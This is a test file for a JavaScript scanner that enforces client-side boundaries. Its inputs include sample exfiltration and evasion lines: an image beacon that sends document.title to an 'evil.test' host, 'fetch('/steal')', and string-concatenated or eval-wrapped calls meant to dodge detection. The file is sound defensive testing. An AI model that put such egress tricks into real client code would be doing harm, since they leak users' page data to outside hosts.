// @vitest-environment node
// Probe tests for the client-boundary scanner: comment/string tricks must neither hide a violation nor invent one.
import { spawnSync } from 'node:child_process';
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { afterAll, describe, expect, it } from 'vitest';
import { stripComments } from './lib/strip-comments.mjs';

const script = fileURLToPath(new URL('./check-client-boundaries.mjs', import.meta.url));
const roots = [];
afterAll(() => { for (const root of roots) rmSync(root, { recursive: true, force: true }); });

function scan(files) {
  const root = mkdtempSync(join(tmpdir(), 'escape-boundary-'));
  roots.push(root);
  for (const [name, text] of Object.entries(files)) {
    mkdirSync(join(root, name, '..'), { recursive: true });
    writeFileSync(join(root, name), text);
  }
  const run = spawnSync(process.execPath, [script, root], { encoding: 'utf8' });
  return { code: run.status, out: `${run.stdout}${run.stderr}` };
}

describe('stripComments', () => {
  it('removes line and block comments but keeps line structure', () => {
    const out = stripComments('a(); // fetch\n/* fetch\nfetch */ b();');
    expect(out).not.toContain('fetch');
    expect(out.split('\n')).toHaveLength(3);
    expect(out).toContain('a();');
    expect(out).toContain('b();');
  });

  it('does not treat // inside a string as a comment', () => {
    expect(stripComments(`const a = 'a//b'; fetch('/x');`)).toContain("fetch('/x')");
    expect(stripComments(`const a = "http://x.test"; fetch("/x");`)).toContain('fetch("/x")');
  });

  it('does not treat // inside a template literal or its ${} expression as a comment', () => {
    expect(stripComments('const a = `http://${host}//x`; fetch(a);')).toContain('fetch(a)');
    expect(stripComments('const a = `${ "//" + fetch(1) } // not a comment`; ok();')).toContain('fetch(1)');
    expect(stripComments('const a = `${ {b: 1}.b }//`; fetch(a);')).toContain('fetch(a)');
  });

  it('does not treat // inside a regular expression as a comment', () => {
    expect(stripComments('const r = /\\/\\//; fetch(r);')).toContain('fetch(r)');
    expect(stripComments('const r = /[/]/; fetch(r);')).toContain('fetch(r)');
  });

  it('does not let a quote inside a comment open a string', () => {
    const out = stripComments("// it's fine\nfetch('/x'); /* don't */ fetch('/y');");
    expect(out).toContain("fetch('/x')");
    expect(out).toContain("fetch('/y')");
  });

  it('keeps division and comments after it apart', () => {
    const out = stripComments('const q = a / b; // fetch\nlocalStorage.x();');
    expect(out).not.toContain('fetch');
    expect(out).toContain('localStorage');
  });
});

describe('check-client-boundaries probes', () => {
  it('passes a clean tree and ignores violations that only appear in comments', () => {
    const result = scan({
      'lib/api.ts': 'export const api = () => fetch("/x");',
      'pages/ok.tsx': '// fetch, localStorage and sessionStorage are discussed here\n/* new WebSocket(url) */\nexport const x = 1;',
    });
    expect(result.code, result.out).toBe(0);
  });

  it("catches fetch hidden behind a 'a//b' string on the same line", () => {
    const result = scan({ 'pages/bad.tsx': "export const x = ['a//b', fetch('/steal')];" });
    expect(result.code).toBe(1);
    expect(result.out).toContain('pages/bad.tsx');
  });

  it('catches storage hidden behind a URL string, a template or a regex', () => {
    expect(scan({ 'a.ts': 'const u = "http://x.test"; localStorage.setItem("k", u);' }).code).toBe(1);
    expect(scan({ 'b.ts': 'const u = `${1}//`; sessionStorage.getItem(u);' }).code).toBe(1);
    expect(scan({ 'c.ts': 'const r = /\\/\\//; indexedDB.open(String(r));' }).code).toBe(1);
  });

  it('catches a call placed after a block comment that contains quotes', () => {
    expect(scan({ 'd.ts': "/* it's */ new WebSocket('wss://x');" }).code).toBe(1);
  });

  it('allows fetch only inside lib/api.ts', () => {
    expect(scan({ 'lib/api.ts': 'fetch("/ok");' }).code).toBe(0);
    expect(scan({ 'lib/other.ts': 'fetch("/no");' }).code).toBe(1);
  });

  it('scans plain JavaScript modules too (F-09)', () => {
    expect(scan({ 'lib/leak.js': 'fetch("/x");' }).code).toBe(1);
    expect(scan({ 'lib/leak.jsx': 'localStorage.clear();' }).code).toBe(1);
    expect(scan({ 'lib/leak.mjs': 'new WebSocket("wss://x");' }).code).toBe(1);
  });

  it('refuses a shipped module that imports a *.test module (F-09)', () => {
    const result = scan({ 'pages/a.tsx': "import { x } from '../lib/helper.test';\nexport const y = x;", 'lib/helper.test.ts': 'export const x = fetch("/z");' });
    expect(result.code).toBe(1);
    expect(result.out).toContain('must not import a *.test file');
    expect(scan({ 'lib/ok.test.ts': 'fetch("/z");' }).code).toBe(0);
  });

  it('is not blinded by a regex literal after a closing brace (F-10)', () => {
    expect(scan({ 'a.ts': 'if (x) { y(); }\n/\\/\\//.test(s); fetch("/steal");' }).code).toBe(1);
    expect(scan({ 'b.ts': 'function f() {}\n/\\/\\//.test(s); localStorage.clear();' }).code).toBe(1);
    expect(stripComments('if (x) { y(); } /\\/\\//.test(s); fetch("/steal");')).toContain('fetch');
  });

  it('catches other egress and loading paths (F-11)', () => {
    for (const code of [
      'new Image().src = "https://evil.test/?" + document.title;',
      'const f = new Function("return fetch")();',
      'eval("fetch(1)");',
      'window["fe" + "tch"]("/x");',
      "globalThis['local' + 'Storage'].clear();",
      "import axios from 'axios';",
      'navigator.serviceWorker.register("/sw.js");',
    ]) expect(scan({ 'pages/bad.ts': code }).code, code).toBe(1);
  });
});
